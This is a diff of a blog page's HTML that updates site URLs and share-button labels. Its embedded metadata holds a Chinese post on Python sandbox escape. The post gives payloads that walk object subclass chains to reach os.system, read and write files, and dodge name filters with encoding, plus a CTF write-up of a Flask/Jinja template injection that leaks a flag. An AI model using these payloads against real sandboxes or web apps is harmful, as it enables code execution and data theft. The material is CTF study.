@@ -11,11 +11,11 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"特殊方法先学习几个方法\ngetattr __getattribute__  __init__  __globals__  __call__  f修饰符\n\n\nf修饰符12&gt;&gt;&gt; f'&#123;__import__(\"os\").system(\"ls\")&#125;'11.py  视频  下载\n\ngetattr(self,attr)触发条件：当获取不存在的对象成员时触发\n参数：self 接收当前对象 attr获取成员名称的字符串\n返回值：必须有值\n作用：为访问不存在的属性设置值\n __getattribute__ 无论何时都会在getattr()之前触发，如果 __getattribute__ 有返回值，就不会在触发getattr()\n__getattribute__ (self,attr)触发条件：调用对象成员时触发，无论是否存在\n参数：同getattr\n返回值：必须有值\n作用：在具有封装操作(私有化时)，为程序开部分访问权限使用\n__init__类实例创建后调用，用于实例化当前实例的一些属性\n__globals__以字典的形式返回函数所在的全局命名空间所定义的全局变量，和func_globals 功能差不多(就是返回当前空间下，能使用的模块，方法，属性的字典)\n__call__使实例能够像函数一样被调用\n__class__获取该实例所属的类\n__mro__返回类的继承顺序，元组形式\n1234&gt;&gt;&gt; ''.__class__.__mro__(&lt;type 'str'&gt;, &lt;type 'basestring'&gt;, &lt;type 'object'&gt;)&gt;&gt;&gt; ''.__class__.__mro__[-1]&lt;type 'object'&gt;\n\n__base__  __bases__获取该类所属的基类\n12345678&gt;&gt;&gt; &apos;&apos;.__class__.__base__&lt;type &apos;basestring&apos;&gt;&gt;&gt;&gt; [].__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; [].__class__.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; [].__class__.__bases__[0]&lt;type &apos;object&apos;&gt;\n\n函数名被过滤可以利用getattr getattribute + 编码绕过\n123456789&gt;&gt;&gt; __import__('os').__getattribute__('flfgrz'.encode('rot13'))('ls')11.py  视频  下载放几个payloadgetattr(__import__(\"os\"),'flfgrz'.encode('rot13'))('ls')getattr(__import__('os'),'metsys'[::-1])('ls')__import__('os').__getattribute__('metsys'[::-1])('ls')\n\n继承链1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__&lt;unbound method catch_warnings.__init__&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']&lt;module 'linecache' from '/usr/lib/python2.7/linecache.pyc'&gt;\n\n来个脚本跑一下，能拿到更多的payload\n123456789101112131415#coding:utf-8search = 'os'   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        if search in i.__init__.__globals__.keys():            print(i, num)    except:        pass \"\"\"(&lt;class 'site._Printer'&gt;, 72)(&lt;class 'site.Quitter'&gt;, 77)\"\"\"\n\n放几个payload python2.x\n12345678910111213141516171819202122# 利用file()函数读取文件：（写类似）().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()# 执行系统命令：().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].os.system('ls')# 执行系统命令：().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").system(\"ls\")')# 重新载入__builtins__：().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").system(\"ls\")#读文件().__class__.__bases__[0].__subclasses__()[40](r'C:\\1.php').read()#写文件().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')#执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls  /var/www/html\").read()' )# 利用 __getattibute__ 方法x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__x.__getattribute__(\"func_global\"+\"s\")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')\n\npython3 \n1234567().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__['system']('ls')().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[\"sys\"].modules[\"os\"].system(\"ls\")''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[\"sys\"].modules[\"os\"].system(\"ls\")[].__class__.__base__.__subclasses__()[127].__init__.__globals__['system']('ls')\n\neg一道ctf记录\n1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index():    return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine):    def safe_jinja(s):        s = s.replace('(', '').replace(')', '')        blacklist = ['config', 'self']        return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__':    app.run(debug=True)\n\n注入点在路径 /shrine/&lt;path:shrine&gt;\n过滤了()  并且把config self置为空\n要是没被处理 可以用\n1234567# confighttp://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;config&#125;&#125;# self# &#123;&#123;self&#125;&#125; =&gt; &lt;TemplateReference None&gt;http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;self.__dict__&#125;&#125;# ()http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;\n\npayload\n123/shrine/&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;/shrine/&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;\n\n参考链接\nhttps://juejin.im/post/5a3de02af265da432653098d\nhttps://xz.aliyun.com/t/2308#toc-4\nhttps://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#i-7\n","dateCreated":"2019-09-13T21:35:24+08:00","dateModified":"2019-11-20T21:24:33+08:00","datePublished":"2019-09-13T21:35:24+08:00","description":"特殊方法先学习几个方法\ngetattr __getattribute__  __init__  __globals__  __call__  f修饰符","headline":"python沙盒逃逸two","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/13/python沙盒逃逸two/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/09/13/python沙盒逃逸two/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"特殊方法先学习几个方法\ngetattr __getattribute__  __init__  __globals__  __call__  f修饰符\n\n\nf修饰符12&gt;&gt;&gt; f'&#123;__import__(\"os\").system(\"ls\")&#125;'11.py  视频  下载\n\ngetattr(self,attr)触发条件：当获取不存在的对象成员时触发\n参数：self 接收当前对象 attr获取成员名称的字符串\n返回值：必须有值\n作用：为访问不存在的属性设置值\n __getattribute__ 无论何时都会在getattr()之前触发，如果 __getattribute__ 有返回值，就不会在触发getattr()\n__getattribute__ (self,attr)触发条件：调用对象成员时触发，无论是否存在\n参数：同getattr\n返回值：必须有值\n作用：在具有封装操作(私有化时)，为程序开部分访问权限使用\n__init__类实例创建后调用，用于实例化当前实例的一些属性\n__globals__以字典的形式返回函数所在的全局命名空间所定义的全局变量，和func_globals 功能差不多(就是返回当前空间下，能使用的模块，方法，属性的字典)\n__call__使实例能够像函数一样被调用\n__class__获取该实例所属的类\n__mro__返回类的继承顺序，元组形式\n1234&gt;&gt;&gt; ''.__class__.__mro__(&lt;type 'str'&gt;, &lt;type 'basestring'&gt;, &lt;type 'object'&gt;)&gt;&gt;&gt; ''.__class__.__mro__[-1]&lt;type 'object'&gt;\n\n__base__  __bases__获取该类所属的基类\n12345678&gt;&gt;&gt; &apos;&apos;.__class__.__base__&lt;type &apos;basestring&apos;&gt;&gt;&gt;&gt; [].__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; [].__class__.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; [].__class__.__bases__[0]&lt;type &apos;object&apos;&gt;\n\n函数名被过滤可以利用getattr getattribute + 编码绕过\n123456789&gt;&gt;&gt; __import__('os').__getattribute__('flfgrz'.encode('rot13'))('ls')11.py  视频  下载放几个payloadgetattr(__import__(\"os\"),'flfgrz'.encode('rot13'))('ls')getattr(__import__('os'),'metsys'[::-1])('ls')__import__('os').__getattribute__('metsys'[::-1])('ls')\n\n继承链1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__&lt;unbound method catch_warnings.__init__&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']&lt;module 'linecache' from '/usr/lib/python2.7/linecache.pyc'&gt;\n\n来个脚本跑一下，能拿到更多的payload\n123456789101112131415#coding:utf-8search = 'os'   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        if search in i.__init__.__globals__.keys():            print(i, num)    except:        pass \"\"\"(&lt;class 'site._Printer'&gt;, 72)(&lt;class 'site.Quitter'&gt;, 77)\"\"\"\n\n放几个payload python2.x\n12345678910111213141516171819202122# 利用file()函数读取文件：（写类似）().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()# 执行系统命令：().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].os.system('ls')# 执行系统命令：().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").system(\"ls\")')# 重新载入__builtins__：().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").system(\"ls\")#读文件().__class__.__bases__[0].__subclasses__()[40](r'C:\\1.php').read()#写文件().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')#执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls  /var/www/html\").read()' )# 利用 __getattibute__ 方法x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__x.__getattribute__(\"func_global\"+\"s\")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')\n\npython3 \n1234567().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__['system']('ls')().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[\"sys\"].modules[\"os\"].system(\"ls\")''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[\"sys\"].modules[\"os\"].system(\"ls\")[].__class__.__base__.__subclasses__()[127].__init__.__globals__['system']('ls')\n\neg一道ctf记录\n1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index():    return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine):    def safe_jinja(s):        s = s.replace('(', '').replace(')', '')        blacklist = ['config', 'self']        return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__':    app.run(debug=True)\n\n注入点在路径 /shrine/&lt;path:shrine&gt;\n过滤了()  并且把config self置为空\n要是没被处理 可以用\n1234567# confighttp://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;config&#125;&#125;# self# &#123;&#123;self&#125;&#125; =&gt; &lt;TemplateReference None&gt;http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;self.__dict__&#125;&#125;# ()http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;\n\npayload\n123/shrine/&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;/shrine/&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;\n\n参考链接\nhttps://juejin.im/post/5a3de02af265da432653098d\nhttps://xz.aliyun.com/t/2308#toc-4\nhttps://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#i-7\n","dateCreated":"2019-09-13T21:35:24+08:00","dateModified":"2019-11-20T21:24:33+08:00","datePublished":"2019-09-13T21:35:24+08:00","description":"特殊方法先学习几个方法\ngetattr __getattribute__  __init__  __globals__  __call__  f修饰符","headline":"python沙盒逃逸two","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"}</script>
     <meta name="description" content="特殊方法先学习几个方法 getattr __getattribute__  __init__  __globals__  __call__  f修饰符">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="python沙盒逃逸two">
-<meta property="og:url" content="http://yoursite.com/2019/09/13/python沙盒逃逸two/index.html">
+<meta property="og:url" content="http://p1keman.github.io/2019/09/13/python沙盒逃逸two/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="特殊方法先学习几个方法 getattr __getattribute__  __init__  __globals__  __call__  f修饰符">
 <meta property="og:locale" content="zh-cn">
@@ -304,7 +304,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -315,7 +315,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -328,7 +328,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -341,7 +341,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -354,7 +354,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -419,7 +419,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -430,7 +430,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -443,7 +443,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -456,7 +456,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -469,7 +469,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -490,7 +490,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
                         aria-label="分享到 Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
@@ -503,7 +503,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -516,7 +516,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/13/python沙盒逃逸two/"
+                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
